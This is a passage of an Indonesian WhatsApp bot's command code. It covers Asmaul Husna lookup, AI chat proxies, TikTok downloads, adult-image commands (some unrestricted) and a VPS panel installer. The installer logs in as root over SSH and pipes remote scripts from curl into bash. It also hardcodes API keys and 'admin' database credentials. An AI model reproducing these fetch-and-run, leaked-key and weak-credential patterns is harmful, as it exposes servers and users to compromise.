        translation_en: "The Judge, the Arbitrator"
    },
    {
        index: 29,
        latin: "Al ‘Adl",
        arabic: "الْعَدْلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Utterly Just"
    },
    {
        index: 30,
        latin: "Al Lathiif",
        arabic: "اللَّطِيفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
        translation_en: "The Subtly Kind"
    },
    {
        index: 31,
        latin: "Al Khabiir",
        arabic: "الْخَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
        translation_en: "The All Aware"
    },
    {
        index: 32,
        latin: "Al Haliim",
        arabic: "الْحَلِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
        translation_en: "The Forbearing, the Indulgent"
    },
    {
        index: 33,
        latin: "Al ‘Azhiim",
        arabic: "الْعَظِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
        translation_en: "The Magnificent, the Infinite"
    },
    {
        index: 34,
        latin: "Al Ghafuur",
        arabic: "الْغَفُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
        translation_en: "The All Forgiving"
    },
    {
        index: 35,
        latin: "As Syakuur",
        arabic: "الشَّكُورُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
        translation_en: "The Grateful"
    },
    {
        index: 36,
        latin: "Al ‘Aliy",
        arabic: "الْعَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Sublimely Exalted"
    },
    {
        index: 37,
        latin: "Al Kabiir",
        arabic: "الْكَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
        translation_en: "The Great"
    },
    {
        index: 38,
        latin: "Al Hafizh",
        arabic: "الْحَفِيظُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
        translation_en: "The Preserver"
    },
    {
        index: 39,
        latin: "Al Muqiit",
        arabic: "المُقيِت",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
        translation_en: "The Nourisher"
    },
    {
        index: 40,
        latin: "Al Hasiib",
        arabic: "الْحسِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
        translation_en: "The Reckoner"
    },
    {
        index: 41,
        latin: "Al Jaliil",
        arabic: "الْجَلِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Majestic"
    },
    {
        index: 42,
        latin: "Al Kariim",
        arabic: "الْكَرِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
        translation_en: "The Bountiful, the Generous"
    },
    {
        index: 43,
        latin: "Ar Raqiib",
        arabic: "الرَّقِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
        translation_en: "The Watchful"
    },
    {
        index: 44,
        latin: "Al Mujiib",
        arabic: "الْمُجِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
        translation_en: "The Responsive, the Answerer"
    },
    {
        index: 45,
        latin: "Al Waasi’",
        arabic: "الْوَاسِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
        translation_en: "The Vast, the All Encompassing"
    },
    {
        index: 46,
        latin: "Al Hakiim",
        arabic: "الْحَكِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
        translation_en: "The Wise"
    },
    {
        index: 47,
        latin: "Al Waduud",
        arabic: "الْوَدُودُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
        translation_en: "The Loving, the Kind One"
    },
    {
        index: 48,
        latin: "Al Majiid",
        arabic: "الْمَجِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The All Glorious"
    },
    {
        index: 49,
        latin: "Al Baa’its",
        arabic: "الْبَاعِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
        translation_en: "The Raiser of the Dead"
    },
    {
        index: 50,
        latin: "As Syahiid",
        arabic: "الشَّهِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
        translation_en: "The Witness"
    },
    {
        index: 51,
        latin: "Al Haqq",
        arabic: "الْحَقُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
        translation_en: "The Truth, the Real"
    },
    {
        index: 52,
        latin: "Al Wakiil",
        arabic: "الْوَكِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
        translation_en: "The Trustee, the Dependable"
    },
    {
        index: 53,
        latin: "Al Qawiyyu",
        arabic: "الْقَوِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
        translation_en: "The Strong"
    },
    {
        index: 54,
        latin: "Al Matiin",
        arabic: "الْمَتِينُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
        translation_en: "The Firm, the Steadfast"
    },
    {
        index: 55,
        latin: "Al Waliyy",
        arabic: "الْوَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
        translation_en: "The Protecting Friend, Patron, and Helper"
    },
    {
        index: 56,
        latin: "Al Hamiid",
        arabic: "الْحَمِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
        translation_en: "The All Praiseworthy"
    },
    {
        index: 57,
        latin: "Al Mushii",
        arabic: "الْمُحْصِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
        translation_en: "The Accounter, the Numberer of All"
    },
    {
        index: 58,
        latin: "Al Mubdi’",
        arabic: "الْمُبْدِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
        translation_en: "The Producer, Originator, and Initiator of all"
    },
    {
        index: 59,
        latin: "Al Mu’iid",
        arabic: "الْمُعِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
        translation_en: "The Reinstater Who Brings Back All"
    },
    {
        index: 60,
        latin: "Al Muhyii",
        arabic: "الْمُحْيِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
        translation_en: "The Giver of Life"
    },
    {
        index: 61,
        latin: "Al Mumiitu",
        arabic: "اَلْمُمِيتُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
        translation_en: "The Bringer of Death, the Destroyer"
    },
    {
        index: 62,
        latin: "Al Hayyu",
        arabic: "الْحَيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
        translation_en: "The Ever Living"
    },
    {
        index: 63,
        latin: "Al Qayyuum",
        arabic: "الْقَيُّومُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
        translation_en: "The Self Subsisting Sustainer of All"
    },
    {
        index: 64,
        latin: "Al Waajid",
        arabic: "الْوَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
        translation_en: "The Perceiver, the Finder, the Unfailing"
    },
    {
        index: 65,
        latin: "Al Maajid",
        arabic: "الْمَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Illustrious, the Magnificent"
    },
    {
        index: 66,
        latin: "Al Wahiid",
        arabic: "الْواحِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
        translation_en: "The One, The Unique, Manifestation of Unity"
    },
    {
        index: 67,
        latin: "Al ‘Ahad",
        arabic: "اَلاَحَدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
        translation_en: "The One, the All Inclusive, the Indivisible"
    },
    {
        index: 68,
        latin: "As Shamad",
        arabic: "الصَّمَدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
        translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
    },
    {
        index: 69,
        latin: "Al Qaadir",
        arabic: "الْقَادِرُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
        translation_en: "The All Able"
    },
    {
        index: 70,
        latin: "Al Muqtadir",
        arabic: "الْمُقْتَدِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
        translation_en: "The All Determiner, the Dominant"
    },
    {
        index: 71,
        latin: "Al Muqaddim",
        arabic: "الْمُقَدِّمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
        translation_en: "The Expediter, He who brings forward"
    },
    {
        index: 72,
        latin: "Al Mu’akkhir",
        arabic: "الْمُؤَخِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
        translation_en: "The Delayer, He who puts far away"
    },
    {
        index: 73,
        latin: "Al Awwal",
        arabic: "الأوَّلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
        translation_en: "The First"
    },
    {
        index: 74,
        latin: "Al Aakhir",
        arabic: "الآخِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
        translation_en: "The Last"
    },
    {
        index: 75,
        latin: "Az Zhaahir",
        arabic: "الظَّاهِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
        translation_en: "The Manifest; the All Victorious"
    },
    {
        index: 76,
        latin: "Al Baathin",
        arabic: "الْبَاطِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
        translation_en: "The Hidden; the All Encompassing"
    },
    {
        index: 77,
        latin: "Al Waali",
        arabic: "الْوَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
        translation_en: "The Patron"
    },
    {
        index: 78,
        latin: "Al Muta’aalii",
        arabic: "الْمُتَعَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Self Exalted"
    },
    {
        index: 79,
        latin: "Al Barri",
        arabic: "الْبَرُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
        translation_en: "The Most Kind and Righteous"
    },
    {
        index: 80,
        latin: "At Tawwaab",
        arabic: "التَّوَابُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
        translation_en: "The Ever Returning, Ever Relenting"
    },
    {
        index: 81,
        latin: "Al Muntaqim",
        arabic: "الْمُنْتَقِمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
        translation_en: "The Avenger"
    },
    {
        index: 82,
        latin: "Al Afuww",
        arabic: "العَفُوُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
        translation_en: "The Pardoner, the Effacer of Sins"
    },
    {
        index: 83,
        latin: "Ar Ra`uuf",
        arabic: "الرَّؤُوفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
        translation_en: "The Compassionate, the All Pitying"
    },
    {
        index: 84,
        latin: "Malikul Mulk",
        arabic: "مَالِكُ الْمُلْكِ",
        translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
        translation_en: "The Owner of All Sovereignty"
    },
    {
        index: 85,
        latin: "Dzul JalaaliWal Ikraam",
        arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
        translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
        translation_en: "The Lord of Majesty and Generosity"
    },
    {
        index: 86,
        latin: "Al Muqsith",
        arabic: "الْمُقْسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Equitable, the Requiter"
    },
    {
        index: 87,
        latin: "Al Jamii’",
        arabic: "الْجَامِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
        translation_en: "The Gatherer, the Unifier"
    },
    {
        index: 88,
        latin: "Al Ghaniyy",
        arabic: "الْغَنِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
        translation_en: "The All Rich, the Independent"
    },
    {
        index: 89,
        latin: "Al Mughnii",
        arabic: "الْمُغْنِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
        translation_en: "The Enricher, the Emancipator"
    },
    {
        index: 90,
        latin: "Al Maani",
        arabic: "اَلْمَانِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
        translation_en: "The Withholder, the Shielder, the Defender"
    },
    {
        index: 91,
        latin: "Ad Dhaar",
        arabic: "الضَّارَّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
        translation_en: "The Distressor, the Harmer"
    },
    {
        index: 92,
        latin: "An Nafii’",
        arabic: "النَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
        translation_en: "The Propitious, the Benefactor"
    },
    {
        index: 93,
        latin: "An Nuur",
        arabic: "النُّورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
        translation_en: "The Light"
    },
    {
        index: 94,
        latin: "Al Haadii",
        arabic: "الْهَادِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
        translation_en: "The Guide"
    },
    {
        index: 95,
        latin: "Al Baadii",
        arabic: "الْبَدِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
        translation_en: "Incomparable, the Originator"
    },
    {
        index: 96,
        latin: "Al Baaqii",
        arabic: "اَلْبَاقِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
        translation_en: "The Ever Enduring and Immutable"
    },
    {
        index: 97,
        latin: "Al Waarits",
        arabic: "الْوَارِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
        translation_en: "The Heir, the Inheritor of All"
    },
    {
        index: 98,
        latin: "Ar Rasyiid",
        arabic: "الرَّشِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
        translation_en: "The Guide, Infallible Teacher, and Knower"
    },
    {
        index: 99,
        latin: "As Shabuur",
        arabic: "الصَّبُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
        translation_en: "The Patient"
    }
]
    let json = JSON.parse(JSON.stringify(asmaulhusna))
    let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
    if (isNaN(args[0])) return reply (`contoh:\nasmaulhusna 1`)
    if (args[0]) {
        if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
        let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
        return reply(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
    }
    reply(`${contoh} + ${data} + ${anjuran}`)
}
break

case "ai-islam": {
if (!q) return reply(`Example : ${prefix+command} create code html & css for hack NASA`)
var js = await fetch(`https://vapis.my.id/api/islamai?q=${q}`) 
var json = await js.json()
reply(json.result)
}
break

case 'ai': case 'openai': {
if (!q) return reply (`Halo ${m.pushName} 👋, perkenalkan nama saya ${botname}-Ai. Namamu pasti ${m.pushName}, bukan? ✨ Saya adalah Ai yang santai, ramah, dan suka ngobrol dengan pengguna.`)
var js = await fetch(`https://api.neoxr.eu/api/meta?q=${q}&apikey=zakkigans12`) 
var json = await js.json()
reply(json.data.message)
}
break

case "ai-inggris": {
if (!q) return reply (`Example : ${prefix+command} create code html & css for hack NASA`)
var js = await fetch(`https://vapis.my.id/api/luminai?q=${q}`) 
var json = await js.json()
reply(json.result)
}
break

case "tiktok2": case "tt2": {
    if (!text) return reply(example("linknya"));
    if (!text.includes('tiktok.com')) return reply("Link tautan tidak valid");

    const apiUrl = `https://api.neoxr.eu/api/tiktok?url=${encodeURIComponent(text)}&apikey=zakkigans12`;

    try {
        const response = await fetch(apiUrl);
        const apiData = await response.json();

        if (!response.ok || !apiData.status || !apiData.data || !apiData.data.video) {
            return reply("Error! Video tidak ditemukan.");
        }

        const { id, caption, author, statistic, music, video } = apiData.data;

        const videoCaption = `🎥 *TikTok Video*  
📌 *ID:* ${id}  
📝 *Caption:* ${caption}  
👤 *Author:* ${author.nickname} (@${author.uniqueId})  
👍 *Likes:* ${statistic.likes} | 💬 *Comments:* ${statistic.comments}  
🔄 *Shares:* ${statistic.shares} | 👀 *Views:* ${statistic.views}  
🎵 *Music:* ${music.title} by ${music.author}`;

        await client.sendMessage(m.chat, {
            video: { url: video },
            caption: videoCaption
        }, { quoted: loli });

        client.sendMessage(m.chat, { react: { text: `〽️`, key: m.key }})
        
        await client.sendButtons(m.chat, {
						"body": `\`「 [ T I K T O K ] 」\`\n\n  *›  UNDUH AUDIO*`,
						"footer": "⿻  ⌜ 𝙎𝙞𝙢𝙥𝙡𝙚 𝘽𝙤𝙩 𝙑𝟏𝟏 ⌟  ⿻",
						"buttons": [{
							"displayText": "𝐒𝐎𝐔𝐍𝐃",
							"id": `.ttmp3 ${text}`
						}]
					}, {
						quoted: loli
					})
        
    } catch (error) {
        console.error(error);
        reply("Error! Terjadi kesalahan saat mengambil video TikTok.");
    }
}
break;

case 'tiktok': case 'tt': {
				if (!text) return reply(`*Example :* \n\n*${prefix+command} Link Url*`)
				if (!text.includes('tiktok.com')) return reply('Url Tidak Mengandung Result Dari Tiktok!')
				const hasil = await tiktokDl(text);
				reply(mess.wait)
				if (hasil.size_nowm) {
					await client.sendFileUrl(m.chat, hasil.data[1].url, `\`\`\`[ T I K T O K ]\`\`\`\n\n*Author* : ${hasil.author.nickname}\n*Capiton* : ${hasil.title}`, m)
					await client.sendButtons(m.chat, {
						"body": `「 \`\`\`[ T I K T O K ]\`\`\` 」\n\n  *›  UNDUH AUDIO*\n*Author* : ${hasil.author.nickname}`,
						"footer": `⿻  ⌜ ${footer} ⌟  ⿻`,
						"buttons": [{
							"displayText": "𝐒𝐎𝐔𝐍𝐃",
							"id": `.ttmp3 ${text}`
						}]
					}, {
						quoted: loli
					})
				} else {
					for (let i = 0; i < hasil.data.length; i++) {
						await client.sendFileUrl(m.chat, hasil.data[i].url, `\`\`\`[ I M A G E ]\`\`\``, m)
					}
					let urlAudio = result.music_info.url;
            await client.sendMessage(m.chat, { audio: { url: urlAudio }, mimetype: 'audio/mpeg' }, { quoted: loli });
				}
			}
			break

case 'hentaineko':
if (!isCreator && !isPremium) return reply(mess.prem)
 let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
client.sendMessage(m.chat, { caption: "Sange Lu Cil 😂", image: { url:waifudd2.data.url } }, { quoted: loli })
break

        	case 'nsfw': {
        	reply(` Process Mengambil Video NSFW `)
			sbe = await randomNsFw()
			cejd = sbe[Math.floor(Math.random(), sbe.length)]
			client.sendMessage(m.chat, {
				video: { url: cejd.video_1 },
				caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`
			}, { quoted: loli })
		}
		break
			case 'r34': {
			async function rule34Random() {
				try {
					let response = await axios.get('https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1')
					let results = response.data
					if (!Array.isArray(results) || results.length === 0) {
						throw new Error('No images found')
					}
					let randomImage = results[Math.floor(Math.random() * results.length)]
					let imageUrl = randomImage.file_url
					if (!imageUrl) {
						throw new Error('Image URL not found')
					}
					return { status: 200, imageUrl }
				} catch (error) {
					console.error('Error:', error)
					return { status: 500, error: error.message }
				}
			}
			async function sendRandomRule34Image(m) {
				try {
					let response = await rule34Random()
					if (response.status !== 200) {
						throw new Error(response.error)
					}
					let imageUrl = response.imageUrl
					client.sendMessage(m.chat, { image: { url: imageUrl }, caption: 'Random Image from Rule34\n\n*Powered By rule34.xxx*' }, { quoted: loli })
				} catch (e) {
					reply(e.message)
				}
			}
			sendRandomRule34Image(m)
		}
		break

case 'gpt': {
  if (!text) return reply(`Hai, apa yang ingin saya bantu?`)
async function openai(text, logic) {
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000, 
            "tokenLimit": 8000, 
            "completionTokenLimit": 5000, 
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let respondNya = await openai(text, "")
reply(respondNya)
}
break



case 'hentai-neko' :
case 'hneko' :
if (!isCreator) return reply(mess.owner)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
client.sendMessage(m.chat, { caption: mess.done, image: { url:waifudd.data.url } }, { quoted: loli })
break

case 'hentaivid': case 'hentaivideo': {
	if (!isCreator) return reply(mess.owner)
reply(mess.wait)
client.sendMessage(m.chat, { video: { url: `https://api.fgmods.xyz/api/nsfw-nime/hentai-mp4?apikey=qzu9Ja5Q`}, 
caption: `success` }, { quoted: loli })
            }
            break
            
            case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await client.sendAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
            
            case 'opentime': {
if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return reply(mess.admin)
if (!m.isBotAdmin) return reply(mess.botAdmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
client.groupSettingUpdate(m.chat, 'not_announcement')
reply(open)
}, timer)
}
break

case 'closetime': {
if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return reply(mess.admin)
if (!m.isBotAdmin) return reply(mess.botAdmin)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return reply('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
reply(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
client.groupSettingUpdate(m.chat, 'announcement')
reply(close)
}, timer)
}
break

case "installtema": case "installthema": {
if (!isCreator) return reply(mess.owner)
if (!text || !text.split("|")) return reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
await client.sendMessage(m.chat, {
  buttons: [{
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Thema Yang Tersedia',
          sections: [
            {
              title: 'List Thema',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'install thema enigma',
                  id: `.installtemaenigma ${text}`
                },
                {
                  title: 'install thema nebula',
                  id: `.installtemanebula ${text}`
                },
                {
                  title: 'install depend',
                  id: `.installdepend ${text}`
                },
                {
                  title: 'install thema elysium',
                  id: `.installtemaelysium ${text}`
                },               
                {
                  title: 'install thema billing',
                  id: `.installtemabilling ${text}`
                },                
                {
                  title: 'install thema nightcore',
                  id: `.installtemanightcore ${text}`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "Kalau mau install thema nebula, install depend terlebih dahulu"
})
}
break



case "installpanel2": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `sudo apt-get remove --purge mysql* -y`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"https://${domainpanel}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"admin\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${passwordPanel}\"}`
}]
})
})} 
}}, {userJid: m.chat, quoted: loli})
await client.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('SG\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Danny S8X\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Danny S8X\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
